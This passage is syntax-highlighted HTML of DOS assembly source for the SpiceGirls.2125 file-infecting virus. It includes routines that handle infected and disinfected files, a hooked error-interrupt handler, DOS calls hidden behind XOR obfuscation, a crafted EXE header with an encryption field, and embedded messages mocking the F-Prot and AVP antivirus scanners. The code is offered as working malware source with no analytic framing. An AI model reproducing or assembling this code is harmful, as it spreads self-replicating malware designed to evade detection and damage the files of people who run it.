         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; SI = bytes left to read</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Read all of the file?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_file_pos</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_file_pos</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">3eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">clean_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_handle_</span><span class="sc4">],</span><span class="sc12">'SG'</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">delete_clean</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_handle_</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dont_delete</span><span class="sc0">     </span><span class="sc1">; Don't delete disinfected file</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc2">41h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'S'</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Delete file</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_handle_</span><span class="sc4">],</span><span class="sc12">'SG'</span><span class="sc0">
</span><span class="sc5">dont_delete</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">

</span><span class="sc5">int24_load</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store segment of interrupt 24h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int24_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Store segment of interrupt 24h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">pre_tst_func</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_handle</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">; Store file handle</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_store</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_handle</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; BX = file handle</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_functio</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int24_load</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int21_exit</span><span class="sc0">

</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 24h of SpiceGirls.2125</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Fail system call in progress</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'What? ''Error: invalid program''? Me? Fprot, are you crazy? :)'</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'And you, Avp, ''EXE file but COM extension''. What a deep scan. ;)'</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'Spice_Girls virus causes problems to your scan engine eh? :)'</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">
</span><span class="sc5">header_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">exe_header</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MZ'</span><span class="sc0">                </span><span class="sc1">; EXE signature</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">pages_end</span><span class="sc4">-</span><span class="sc5">pages_begin</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">pages_end</span><span class="sc4">-</span><span class="sc5">pages_begin</span><span class="sc4">)/</span><span class="sc2">200h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">relo_end</span><span class="sc4">-</span><span class="sc5">relo_begin</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">head_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">; Minimum-, maximum number of para...</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0ffeah</span><span class="sc4">,</span><span class="sc5">stack_ptr</span><span class="sc0">    </span><span class="sc1">; Pointer to stack</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SG'</span><span class="sc0">                </span><span class="sc1">; Checksum</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea00b2h</span><span class="sc0">      </span><span class="sc1">; Pointer to service request + 02h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">relocations</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; Offset of relocations - 100h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Overlay number (main program)</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea0178h</span><span class="sc4">,</span><span class="sc2">0ffea017ch</span><span class="sc4">,</span><span class="sc2">0ffea0180h</span><span class="sc4">,</span><span class="sc2">0ffea0184h</span><span class="sc4">,</span><span class="sc2">0ffea0188h</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea018ch</span><span class="sc4">,</span><span class="sc2">0ffea0190h</span><span class="sc4">,</span><span class="sc2">0ffea0194h</span><span class="sc4">,</span><span class="sc2">0ffea01beh</span><span class="sc4">,</span><span class="sc2">0ffea01f8h</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ffea0206h</span><span class="sc4">,</span><span class="sc2">0ffea0218h</span><span class="sc4">,</span><span class="sc2">0ffea0228h</span><span class="sc4">,</span><span class="sc2">0ffea025ch</span><span class="sc4">,</span><span class="sc2">0ffea0272h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' - Spice_Girls.2125 - '</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0ffea00b2h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; Seven pointers to service reques...</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">virus_begin</span><span class="sc0">     </span><span class="sc1">; Offset of virus_begin</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0ffeah</span><span class="sc0">      </span><span class="sc1">; Segment of virus_begin</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">crypt_begin</span><span class="sc0">     </span><span class="sc1">; Offset of crypt_begin</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; 16-bit encryption/decryption key</span><span class="sc0">
</span><span class="sc5">header_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">psp_segment</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Segment of PSP for current proce...</span><span class="sc0">
</span><span class="sc5">int21_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">int24_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 24h</span><span class="sc0">
</span><span class="sc5">dos_function</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; DOS function number</span><span class="sc0">
</span><span class="sc5">name_pointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Pointer to filename</span><span class="sc0">
</span><span class="sc5">file_handle</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File handle</span><span class="sc0">
</span><span class="sc5">exe_head_sig</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; EXE header signature</span><span class="sc0">
</span><span class="sc5">file_attr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File attributes</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File time</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File date</span><span class="sc0">
</span><span class="sc5">origin_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">terminate</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">; Offset of original code</span><span class="sc0">
</span><span class="sc5">file_handle_</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File handle</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Filename</span><span class="sc0">
</span><span class="sc5">crypt_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">code_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">memory_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">terminate</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">        </span><span class="sc1">; Terminate with return code</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">241h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">pages_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">      </span><span class="sc5">head_begin</span></div></body>
</html>
